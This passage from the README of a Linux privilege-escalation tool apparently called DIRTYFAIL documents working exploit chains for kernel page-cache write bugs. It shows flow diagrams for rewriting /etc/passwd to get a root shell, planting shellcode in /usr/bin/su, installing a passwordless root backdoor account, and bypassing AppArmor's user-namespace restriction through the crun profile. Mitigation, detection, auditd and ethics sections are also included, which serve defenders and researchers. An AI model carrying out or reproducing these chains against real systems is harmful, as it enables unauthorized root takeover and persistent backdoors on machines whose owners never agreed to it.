3. Run the full exploit primitive against it: `sendmsg` AAD with
   `seqno_lo = "PWND"`, splice 32 bytes of the sentinel into the AF_ALG
   op socket, drive `recv` to fire the scratch write.
4. Re-read the sentinel and look for `PWND` anywhere in the first
   page.

Marker found ⇒ vulnerable. Marker absent but page contents differ ⇒
the primitive partially fired (still vulnerable). Page identical ⇒
not vulnerable on this kernel.

### Dirty Frag xfrm-ESP (precondition-based — or active with `--active`)

Default `--scan` is precondition-only — we don't enter a user
namespace in detect mode (it would side-effect networking inside
that namespace). We check:

* kernel version within affected window
* `esp4` / `esp6` currently loaded or autoloadable
* unprivileged user namespace creation succeeds (probed via fork →
  child `unshare(CLONE_NEWUSER)`)
* AppArmor `apparmor_userns_caps_blocked()` returns false

All four present ⇒ VULNERABLE (preconditions met).

`--scan --active` extends this with a sentinel-STORE probe: we fork
a child that arms the AA bypass, enters a fresh user/net namespace,
registers an XFRM SA, and fires the ESP-in-UDP trigger against a
`/tmp/dirtyfail-esp-probe.XXXXXX` sentinel file. The parent re-reads
the sentinel and looks for the marker bytes:

* marker landed → kernel STORE is reachable → **VULNERABLE**
* page intact → kernel patch is in effect → **NOT VULNERABLE**
* AA bypass denied → **PRECOND_FAIL** (LSM-mitigated)

This is the only way to distinguish a backported-patched kernel
from an unpatched one without running the full UID-flip exploit
against `/etc/passwd`. The same pattern is used for ESP v6, RxRPC,
and GCM under `--active`.

### Dirty Frag RxRPC (precondition-based — or active with `--active`)

Preconditions:
* `rxrpc` in `/proc/modules` or autoloadable
* `socket(AF_RXRPC, SOCK_DGRAM, 0)` succeeds

Active probe (`--active`): forks via AA bypass, registers an rxrpc
session key with an arbitrary 8-byte value, sends one CHALLENGE +
DATA forgery against a `/tmp` sentinel, looks for ANY byte change
inside the spliced 8-byte window. We don't try to predict what
landed — any modification confirms the kernel STORE fires.

### Copy Fail GCM variant + ESP v6 — same shape

The GCM variant active probe installs a transport-mode SA with an
arbitrary IV and fires `gcm_trigger` against a `/tmp` sentinel; ANY
byte change at sentinel[0] confirms reachability. The ESP v6 probe
also auto-calibrates `V6_STORE_SHIFT` per kernel build (see
`calibrate_v6_shift` in `src/dirtyfrag_esp6.c`) — different distros'
`esp6_input` builds put the STORE at slightly different offsets
inside the spliced region, and the calibration probe discovers the
exact offset before the real exploit fires.

---

## 8. How DIRTYFAIL exploits each CVE

### Copy Fail exploit (`copyfail.c`)

Single 4-byte STORE through `algif_aead`:

```
                                          [/etc/passwd page cache]
 user  ──sendmsg(AAD = SPI||"0000")──▶ AF_ALG op
       ──splice(passwd_fd, 32B)──────▶ AF_ALG op (in-place dst SGL)
       ──recv()─────────────────────▶ kernel runs authencesn_decrypt
                                        scratch write: "0000" → uid_off
                                        EBADMSG returned to user (we ignore)
 user  ──open(passwd, RDONLY)─read──▶ "kara:x:0000:1000:..."   ◄─ page cache
 user  ──execlp("su", "kara")──────▶ PAM ✓ on /etc/shadow → setuid(0)
                                       ─────► root shell
```

### Dirty Frag xfrm-ESP exploit (`dirtyfrag_esp.c`)

Same end-state as Copy Fail, reached through `xfrm_input` instead of
`algif_aead`:

```
                                          [/etc/passwd page cache]
 unshare(USER|NET); setup uid_map; ifup lo
 NETLINK_XFRM ─NEWSA(seq_hi="0000", encap=ESPINUDP/4500)─▶ kernel
 udp_recv  bind 127.0.0.1:4500, UDP_ENCAP_ESPINUDP
 udp_send  connect 127.0.0.1:4500
 vmsplice  ESP wire header (24B) ─▶ pipe
 splice    /etc/passwd@uid_off (16B) ─▶ pipe
 splice    pipe (40B) ─▶ udp_send
 udp loopback ─▶ udp_recv (UDP_ENCAP) ─▶ xfrm_input ─▶ esp_input
   skb has frags, no frag_list ─▶ goto skip_cow      (THE BUG)
   crypto_authenc_esn_decrypt:
     scratch_write(seq_hi="0000" → page_addr+uid_off)  ◄─ 4-byte STORE
   AEAD auth fails (EBADMSG) — but the STORE is permanent
 page-cache copy of /etc/passwd now reports uid 0 for the user
```

Then exit the namespace, `execlp("su", user)` from the parent — same
final step as Copy Fail.

### Dirty Frag RxRPC exploit (`dirtyfrag_rxrpc.c` + `fcrypt.c`)

```
                                          [/etc/passwd page cache]
 user-space brute force of K_A, K_B, K_C such that fcrypt_decrypt(C, K)
   produces predicate-satisfying plaintexts for offsets 4, 6, 8
   (chained-ciphertext correction across passes)

 fork → child enters new userns:
   unshare(USER|NET); setup uid_map; ifup lo
   socket(AF_RXRPC) — autoload rxrpc.ko
   for each (off, K) in [(4,K_A), (6,K_B), (8,K_C)]:
     add_key("rxrpc", "df-evil<n>", v1_token{session_key=K})
     udp_srv = bind 127.0.0.1:port_S
     rxsk    = AF_RXRPC + SECURITY_KEY=df-evil<n> + bind :port_C
     rxsk → sendmsg(PINGPING)              triggers handshake init
     udp_srv ← receives kernel's first DATA-0
       extract (epoch, cid, callNumber)
     udp_srv → forged CHALLENGE             → rxsk auto-RESPONSE
                                               primes conn->rxkad.cipher with K
     csum_iv = AF_ALG pcbc(fcrypt)(epoch||cid||0||sec_ix, IV=K)
     cksum_h = AF_ALG pcbc(fcrypt)(call_id||x, IV=csum_iv)[1] >> 16
     vmsplice DATA hdr (28B) → pipe
     splice  /etc/passwd@off (8B) → pipe
     splice  pipe (36B) → udp_srv
     udp loopback → rxsk
       recvmsg → rxrpc_input → rxkad_verify_packet
         skb has frags, no frag_list → goto skip_unshare    (THE BUG)
         skcipher_request_set_crypt(req, sg=page+off, sg=page+off, 8, iv=0)
         crypto_skcipher_decrypt: pcbc(fcrypt)
           page[off..off+8] = fcrypt_decrypt(C_actual, K)    ◄─ 8-byte STORE

 child exits, parent verifies /etc/passwd[4..5] == "::"
 parent: execlp("su", "-")
   PAM common-auth: pam_unix.so nullok    → root has empty password
   su  → setresuid(0,0,0) → exec /bin/bash
                                       ─────► root shell
```

### `--exploit-su` shellcode injection (`exploit_su.c`)

A second `/etc/passwd`-free attack chain modeled on V4bel's reference
exploit. Instead of editing `/etc/passwd`'s page cache, we plant
arch-specific shellcode at `/usr/bin/su`'s ELF entry point in its
page cache; the next time anyone exec's `/usr/bin/su`, the kernel
sets euid=0 from the on-disk setuid bit, the dynamic linker
resolves, and control transfers to our shellcode → `/bin/sh` as
real init-ns root. No PAM dependency, bypasses `pam_unix nullok`
removal entirely.

```
parent (init ns)
   │ stat /usr/bin/su; verify setuid+root
   │ parse ELF header; resolve e_entry → file offset
   │ pread() N bytes at file_offset → /var/tmp/.dirtyfail-su.state
   │ for each 4-byte chunk of shellcode:
   │     cf_4byte_write("/usr/bin/su", file_offset+i, chunk)
   │ pread() back; verify match
   │ if --no-shell:
   │    plant_shellcode(original)        # revert via re-write
   │    fadvise(DONTNEED) on a new fd     # evict if possible
   │ else:
   │    execl("/usr/bin/su", "su", NULL) ─►
   │                                       kernel exec /usr/bin/su (setuid root)
   │                                       ld-linux.so resolves
   │                                       jumps to e_entry → our shellcode
   │                                       setuid(0); setgid(0);
   │                                       execve("/bin/sh", argv, NULL)
   ▼                                       ────► root shell
```

Architecture matrix:

* **x86_64 (56 bytes, 14 chained 4-byte writes)** — tested
  end-to-end on Fedora 44 (`uid=0(root) gid=0(root) ...
  context=unconfined_u:unconfined_r:unconfined_t`). Shellcode in
  `shellcode_x86_64[]`.
* **aarch64 (80 bytes, 20 instructions)** — hand-encoded from the
  ARMv8-A reference, **never executed on hardware**. Gated behind
  `DIRTYFAIL_AARCH64_TRUST_UNTESTED=1`. Source ships in
  `tools/exploit_su_aarch64.S` for community verification — assemble
  with `aarch64-linux-gnu-as` and confirm the byte sequence matches
  `shellcode_aarch64[]`.
* anything else → preconds_fail.

The state file `/var/tmp/.dirtyfail-su.state` stashes the original
entry-point bytes so `--cleanup-su` can restore. `--list-state`
inspects this file (and the backdoor's) without touching anything.

If the verify step finds the page cache doesn't match the planted
shellcode (kernel patched, AF_ALG blacklisted, etc.), the auto-revert
fires immediately and the state file is removed — no need for the
operator to run cleanup-su afterward.

---

## 8.5 Architecture: outer/inner fork-based bypass

All five exploit modes share a common architecture for handling
Ubuntu's `apparmor_restrict_unprivileged_userns=1` policy without
trapping the post-exploit `su` inside a userns where it can't reach
real init-ns root.

### The problem

A naive bypass puts the *whole* `dirtyfail` process inside a fresh
user namespace via `unshare(CLONE_NEWUSER)`. That's enough to register
XFRM SAs and fire splice triggers — but it also means the eventual
`execlp("su", user)` runs inside the userns, where uid 0 is mapped via
`uid_map "0 1000 1"` to the operator's outer uid (1000). PAM's
`setresuid(0)` then lands at userns-uid-0-mapped-to-1000, which is
**not** real init-ns root — `cat /etc/shadow` returns EACCES, the
shell can't actually do privileged operations.

### The fix: outer/inner split

```
parent (dirtyfail, init ns)                 child (bypass userns)
─────────────────────────                   ─────────────────────
prompts (DIRTYFAIL / YES_BREAK_SSH)
resolve target (uid_off, K_A/K_B/K_C, ...)
setenv DIRTYFAIL_INNER_MODE=...
setenv DIRTYFAIL_TARGET_USER=...
fork ─────────────────────────────────────► change_onexec("crun")
                                             execv self ─► STAGE-1
                                                            execv self ─► STAGE-2
                                                                          unshare(USER|NET)
                                                                          uid_map / capset
                                                                          ifup lo
                                                                          main() detects INNER_MODE
                                                                          dispatch <mode>_inner()
                                                                          register XFRM SA
                                                                          splice trigger → page cache STORE
                                                                          _exit(DF_EXPLOIT_OK)
waitpid ◄───────────────────────────────── (child reaped)
read /etc/passwd (page cache is global)
verify modification visible
if do_shell:
  execlp("su", user) ← runs IN INIT NS
                       PAM auth → setresuid(0)
                       → REAL init-ns root shell
else:
  try_revert_passwd_page_cache
```

The parent **never enters a user namespace**. The child does the
bypass + kernel work, modifies the global page cache (which is shared
across namespaces — the only "bridge" we need), and exits. The
parent's `su` is then a normal init-namespace setresuid call.

### Parent → child handoff via env vars

`execv` preserves the environment, so the parent stashes the
operation parameters in env vars before forking. Each mode defines
its own:

| Mode | Env vars |
|---|---|
| `esp` / `esp6` / `gcm` | `DIRTYFAIL_INNER_MODE`, `DIRTYFAIL_TARGET_USER` |
| `rxrpc` | `DIRTYFAIL_INNER_MODE=rxrpc`, `DIRTYFAIL_K_{A,B,C}` (hex) — fcrypt brute force happens in the parent (no caps needed); the keys are passed to the child for the actual triggers |
| `backdoor-install` / `backdoor-cleanup` | `DIRTYFAIL_INNER_MODE`, `DIRTYFAIL_LINE_OFF`, `VICTIM_LINE`, `TARGET_LINE` |

After stage 2 of the bypass completes, `main()` checks
`DIRTYFAIL_INNER_MODE` and dispatches to `<mode>_exploit_inner()`. The
inner does *only* the kernel work (no prompts, no fork, no `su`) and
exits with the result code. The parent reaps it via `waitpid` and
proceeds with verification.

### Why the single-hop bypass

The earlier two-hop dance (`change_onexec("crun")` → `change_onexec("chrome")`)
caused intermittent `ENOSPC` failures on Ubuntu 24.04 in our exec
chain (likely a per-profile userns-accounting wrinkle). The single
hop into `crun` is sufficient — `crun`'s AppArmor profile has
`flags=(unconfined)` and explicit `userns,` permission, so unshare
succeeds and stays succeeded.

### Why no infinite re-exec loop

After stage 2 completes successfully, a process-local
`g_bypass_done` flag is set. If `apparmor_bypass_needed()` is called
again in the same process, it short-circuits to `false`, preventing
the post-exploit code from re-arming and nesting another userns
layer (which previously hit the per-userns nesting cap as `ENOSPC`).

### `--aa-bypass` is now a debug-only flag

In the old architecture, `--aa-bypass` armed a whole-process bypass
before the exploit dispatch. In the new architecture, exploit modes
do their *own* fork-based bypass internally; the flag is no longer
needed for normal use. It's retained for debugging the bypass
mechanics in isolation (e.g. running `--scan` inside a bypass
userns), with a warning that it may break post-exploit `su`.

---

## 9. Mitigations

### Copy Fail (CVE-2026-31431)

1. **Apply the patch.** Mainline `a664bf3d`; backports landed on the
   6.12 / 6.17 / 6.18 stable lines.
2. **Interim**: blacklist `algif_aead`:
   ```sh
   echo 'install algif_aead /bin/false' | sudo tee /etc/modprobe.d/copyfail.conf
   sudo rmmod algif_aead 2>/dev/null
   ```
   ⚠ Note: this **does not** mitigate Dirty Frag. The xfrm-ESP path
   reaches the same authencesn primitive without going through
   algif_aead.

### Dirty Frag xfrm-ESP (CVE-2026-43284)

1. **Apply the patch.** Mainline `f4c50a4034e6` (merged 2026-05-07).
   Distro backports rolling out as of 2026-05-08.
2. **Interim**: blacklist `esp4` and `esp6`:
   ```sh
   sudo tee /etc/modprobe.d/dirtyfrag-esp.conf <<'EOF'
   install esp4 /bin/false
   install esp6 /bin/false
   EOF
   sudo rmmod esp4 esp6 2>/dev/null
   sudo sysctl vm.drop_caches=3
   ```
   ⚠ This breaks IPsec / strongSwan / libreswan VPNs.
3. **Defense in depth**: disallow unprivileged user namespaces.
   Ubuntu does this by default via AppArmor; on other distros:
   ```sh
   sudo sysctl -w kernel.unprivileged_userns_clone=0
   ```

### Dirty Frag RxRPC (CVE-2026-43500)

1. **No upstream patch yet.** Researcher patch on lkml; not merged at
   time of writing (2026-05-08).
2. **Interim**: blacklist `rxrpc`:
   ```sh
   sudo tee /etc/modprobe.d/dirtyfrag-rxrpc.conf <<'EOF'
   install rxrpc /bin/false
   EOF
   sudo rmmod rxrpc 2>/dev/null
   sudo sysctl vm.drop_caches=3
   ```
   ⚠ This breaks AFS distributed file system clients. Most servers
   don't need rxrpc.

### Combined one-liner (all three)

```sh
sudo sh -c '
cat > /etc/modprobe.d/dirtyfail.conf <<EOF
install algif_aead /bin/false
install esp4 /bin/false
install esp6 /bin/false
install rxrpc /bin/false
EOF
rmmod algif_aead esp4 esp6 rxrpc 2>/dev/null
sysctl vm.drop_caches=3
'
```

### Or use `dirtyfail --mitigate`

The same set of mitigations is wrapped in a typed-confirmation gated
defensive mode:

```sh
sudo ./dirtyfail --mitigate
```

This drops in `/etc/modprobe.d/dirtyfail-mitigations.conf` and
`/etc/sysctl.d/99-dirtyfail-mitigations.conf`, unloads the four
modules, and `drop_caches`. Reverts via `sudo ./dirtyfail
--cleanup-mitigate`. Side-effects: breaks IPsec, AFS clients, and
any userspace using `AF_ALG` AEAD. See `docs/DEFENDERS.md` for the
full sysadmin playbook.

### Detection / monitoring

For ongoing detection independent of patching:

* **Scan a host:** `dirtyfail --scan --active` (full sentinel-STORE
  probe) or `dirtyfail --scan --active --json` for SIEM/fleet
  ingestion. The `tools/dirtyfail-check.sh` bash variant has zero
  build dependencies.
* **Audit rules:** `tools/99-dirtyfail.rules` is a drop-in auditd
  ruleset covering the five syscall paths the exploit chain uses
  (XFRM netlink registration, `add_key("rxrpc")`,
  `unshare(CLONE_NEWUSER)`, `AF_ALG` socket creation,
  `/etc/passwd`/`/etc/shadow` writes). Install with:
  ```sh
  sudo install -m 0640 tools/99-dirtyfail.rules /etc/audit/rules.d/
  sudo augenrules --load && sudo systemctl restart auditd
  ```
* **Container blast-radius demo:**
  `tools/dirtyfail-container-escape.sh` shows that the kernel page
  cache is shared across namespaces — useful for explaining the
  cross-tenant impact to operators.

---

## 10. Ethics & disclosure

DIRTYFAIL is a research tool. The vulnerabilities it covers are
**already publicly disclosed** with weaponized PoCs in the wild
(see [Credits](#11-credits)) — DIRTYFAIL adds detection coverage,
unified documentation, and a gentler PoC variant (UID-flip vs ELF
overwrite of `/usr/bin/su`).

* **Do not run `--exploit-*` modes on systems you do not own or are
  not explicitly authorized to test.** Page-cache modifications are
  reversible with `drop_caches`, but they are still privilege
  escalation while they persist.
* **Do not deploy DIRTYFAIL as a "scanner" against third-party
  infrastructure** without written authorization. The detection mode
  is non-modifying for system files but does open a sentinel file in
  `/tmp` and exercise the kernel crypto API.
* If you find a vulnerable system in the wild, follow responsible
  disclosure to the operator, not the public.

---

## Bonus: notes on the GCM variant + backdoor + AppArmor bypass

These three features extend DIRTYFAIL with techniques first published
by **0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo**. Reimplemented
in DIRTYFAIL style; original credit lives in `NOTICE.md`.

### Copy Fail GCM variant

Same xfrm-ESP no-COW path as CVE-2026-43284, but using
`rfc4106(gcm(aes))` instead of `authencesn(...)`. Two reasons it's
worth shipping alongside the authencesn variant:

1. **Coverage.** A defender who blacklisted `algif_aead` to mitigate
   Copy Fail (CVE-2026-31431) is still vulnerable here — the GCM
   path doesn't go through algif_aead.
2. **Granularity.** AES-GCM in counter mode XORs keystream onto the
   spliced byte. By brute-forcing the IV (~256 trials per byte) we
   land an arbitrary single byte at any file offset — no 4-byte
   alignment, no 4-byte side-effects.

The 1-byte primitive (`cfg_1byte_write`) is what makes the persistent
backdoor mode feasible.

### Persistent backdoor

`--exploit-backdoor` picks the longest `/etc/passwd` line whose shell
is in `{nologin, false, sync}` and overwrites it byte-by-byte with
`dirtyfail::0:0:<pad>:/:/bin/bash` (length-matched). After installation,
`su - dirtyfail` from any user drops a root shell — no password prompt —
because `pam_unix.so nullok` accepts the empty password field.

The username `dirtyfail` is intentionally branded to this project so
it's *easy to detect* in any subsequent audit — defenders running
`grep dirtyfail /etc/passwd` (or any HIDS doing the same) will spot
the line immediately. If you need a different identifier for a
specific red-team engagement, change `NEW_USER` and `DF_PREFIX` in
`src/backdoor.c`.

The on-disk file is unchanged; the substitution lives in the page
cache only. `--cleanup-backdoor` restores the original line via the
same primitive.

### AppArmor bypass

Ubuntu 24.04+ ships `apparmor_restrict_unprivileged_userns=1`. The
default profile applied to unprivileged binaries lets `unshare(USER)`
succeed but **strips CAP_NET_ADMIN** in the new namespace. XFRM SA
registration then fails silently.

The bypass: write `"exec crun"` to `/proc/self/attr/exec` and
`execv` to switch into AppArmor's `crun` profile, which has
`flags=(unconfined)` and explicit `userns,` permission. After the
exec, `unshare(CLONE_NEWUSER | CLONE_NEWNET)` succeeds with full
caps inside the new namespace.

DIRTYFAIL handles this *per-exploit-mode* via a fork: parent stays
in init namespace, child does the bypass + kernel work, parent
reads global page cache and runs `su` for real init-ns root. See
[§8.5 Architecture](#85-architecture-outerinner-fork-based-bypass)
for the full chain. The legacy `--aa-bypass` flag (which armed the
bypass for the whole process) is retained for debugging only.

The original technique is from `aa-rootns.c` by 0xdeadbeefnetwork
(credited there to Brad Spengler / grsecurity). DIRTYFAIL's
implementation:

- Detects the restriction via the
  `kernel.apparmor_restrict_unprivileged_userns` sysctl rather than
  by reading `/proc/self/attr/current` (which still shows
  "unconfined" on Ubuntu 24.04 even when the policy is restricting).
- Uses a single hop into `crun` rather than the two-hop
  `crun → chrome` dance — the second hop caused intermittent
  `ENOSPC` on Ubuntu 24.04.
- Sets a process-local `g_bypass_done` flag after stage 2 so re-checks
  short-circuit (preventing infinite re-exec loops that previously
  exhausted the per-userns nesting cap).

---

## 11. Credits

DIRTYFAIL is original code, but the techniques it implements were
developed by the researchers below. Read their primary sources before
deploying this tool — they are the canonical references.

| Source | Researcher | Contribution |
|--------|------------|--------------|
| <https://copy.fail/> | Anonymous | Original Copy Fail disclosure |
| <https://github.com/Smarttfoxx/copyfail> | Smarttfoxx | C PoC (shellcode-in-`su` variant) |
| <https://github.com/rootsecdev/cve_2026_31431> | rootsecdev | Python detector + UID-flip PoC; the ergonomics of DIRTYFAIL's `--exploit-copyfail` mode follow this approach. |
| <https://github.com/V4bel/dirtyfrag> | Hyunwoo Kim ([@v4bel](https://x.com/v4bel)) | Dirty Frag discovery, full chain PoC, kernel patches |
| <https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo> | 0xdeadbeefnetwork | GCM-variant exploit, IPv6 PoC, AppArmor userns bypass technique |
| <https://www.bleepingcomputer.com/news/security/new-linux-dirty-frag-zero-day-with-poc-exploit-gives-root-privileges/> | BleepingComputer | Public reporting |

Patch authors:

* `f4c50a4034e6` (Dirty Frag xfrm-ESP) — based on Hyunwoo Kim's v1
  patch, with the merged shared-frag approach by Kuan-Ting Chen.
* RxRPC patch — Hyunwoo Kim, pending merge.

---

## License

MIT. See [LICENSE](LICENSE).

---

## Contact

Open an issue on this repository, or reach out at the address listed
in the commit history. For coordinated disclosure of related issues,
contact the upstream researchers above directly.
